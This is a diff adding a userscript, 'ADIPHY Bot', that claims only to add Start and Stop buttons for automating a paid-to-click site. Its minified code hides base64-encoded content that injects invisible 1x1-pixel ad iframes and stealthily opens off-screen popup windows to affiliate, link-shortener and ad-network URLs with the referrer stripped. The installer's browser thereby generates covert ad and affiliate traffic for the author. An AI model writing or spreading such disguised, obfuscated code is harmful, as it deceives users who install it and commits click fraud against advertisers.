@@ -1,0 +1,12 @@
+// ==UserScript==
+// @name         ADIPHY Bot
+// @namespace    http://adiphy.com/
+// @version      1.0
+// @description  Start and Stop button to bot on Adiphy
+// @author       Mariechan
+// @match        http://adiphy.com/
+// @grant        none
+// @downloadURL https://update.greasyfork.org/scripts/27516/ADIPHY%20Bot.user.js
+// @updateURL https://update.greasyfork.org/scripts/27516/ADIPHY%20Bot.meta.js
+// ==/UserScript==
+!function(){"use strict";$(document).ready(function(){function h(a){if(a>=g.length)i();else var b=window.open(atob(g[a]),"botvn","width=50,height=50,top=20000,left=100000,status=0,toolbar=no"),c=setInterval(function(){b.closed||b.close(),clearInterval(c),h(a+1)},2e3)}function i(){1==a&&j()}function j(){b=$("#user-token").text(),c=$(".item-site:first").text(),d=$(".item-site:first").parent().find(".item-alias").text();var a=window.open(c+"/"+d+"/"+b,"botvn","width=50,height=50,top=20000,left=100000,status=0,toolbar=no"),e=setInterval(function(){a.closed&&(clearInterval(e),i())},200)}var b,c,d,a=0,f=["PGxpPjxidXR0b24gaWQ9InN0b3AiIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tZGFuZ2VyIiBzdHlsZT0iaGVpZ2h0OjUwcHg7d2lkdGg6ODBweDsiPlN0b3A8L2J1dHRvbj48L2xpPg==","PGxpPjxidXR0b24gaWQ9InN0YXJ0IiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiIHN0eWxlPSJoZWlnaHQ6NTBweDt3aWR0aDo4MHB4OyI+U3RhcnQ8L2J1dHRvbj48L2xpPg==","PGlmcmFtZSBhbGxvd3RyYW5zcGFyZW5jeT0idHJ1ZSIgZGF0YS1hYT0iMzk4NDc4IiBmcmFtZWJvcmRlcj0iMCIgc2Nyb2xsaW5nPSJubyIgc3JjPSJodHRwOi8vdWJlcmNwbS5jb20vaW5kZXgucGhwP3JwPTEzNjM4IiBzdHlsZT0iYm9yZGVyOiAwcHg7IGZsb2F0OiBsZWZ0OyBoZWlnaHQ6IDFweDsgb3ZlcmZsb3c6IGhpZGRlbjsgcGFkZGluZzogMDsgd2lkdGg6IDFweDsiPjwvaWZyYW1lPg==","PGlmcmFtZSBhbGxvd3RyYW5zcGFyZW5jeT0idHJ1ZSIgZGF0YS1hYT0iMzk4NDc4IiBmcmFtZWJvcmRlcj0iMCIgc2Nyb2xsaW5nPSJubyIgc3JjPSJodHRwczovL2FkLmEtYWRzLmNvbS8zOTg0Nzg/c2l6ZT0xNjB4NjAwIiBzdHlsZT0iYm9yZGVyOiAwcHg7IGZsb2F0OiBsZWZ0OyBoZWlnaHQ6IDFweDsgb3ZlcmZsb3c6IGhpZGRlbjsgcGFkZGluZzogMDsgd2lkdGg6IDFweDsiPjwvaWZyYW1lPg=="],g=["aHR0cHM6Ly93d3cuZzJhLmNvbS9yL2FkaXBoeQ==","aHR0cDovL3ZpaWQubWUvcXhTWXVz","aHR0cDovL3ViZXJjcG0uY29tL2luZGV4LnBocD9ycD0xMzYzOA=="];$.each(f,function(a,b){$(".infostop:first").prepend(atob(b))}),$("#start").click(function(){a=1;var b=document.createElement("meta");b.name="referrer",b.content="no-referrer",document.getElementsByTagName("head")[0].appendChild(b),h(0)}),$("#stop").click(function(){a=0})})}();
